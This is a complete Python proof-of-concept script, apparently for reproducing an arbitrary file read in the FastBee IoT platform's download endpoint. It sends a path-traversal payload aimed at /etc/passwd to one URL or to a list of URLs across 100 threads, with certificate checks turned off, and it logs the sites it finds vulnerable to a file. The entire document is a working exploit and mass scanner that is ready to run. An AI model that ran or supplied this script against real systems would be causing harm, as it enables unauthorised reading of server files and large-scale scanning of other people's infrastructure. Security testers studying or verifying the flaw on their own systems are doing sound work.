import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = '''
    <<<<<<<<<<蜂信物联 FastBee 开源物联网平台 download 任意文件读取漏洞复现>>>>>>>>
    '''
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join()
def poc(target):
    payload = "/prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd"
    headers = {
        "User-Agent":"Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
        "Accept-Encoding":"gzip,deflate",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests":"1",
        "Priority":"u=0,1",
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False)
        if res.status_code == 200 and 'root:x:0:0:root:/root:/bin/bash' in res.text:
            print(f'[+]{target}该url存在任意文件读取漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}该url不存在漏洞')

    except Exception as e:
        print(f'[?]{target}该网站异常，请手工测试')
if __name__ == '__main__':
    main()
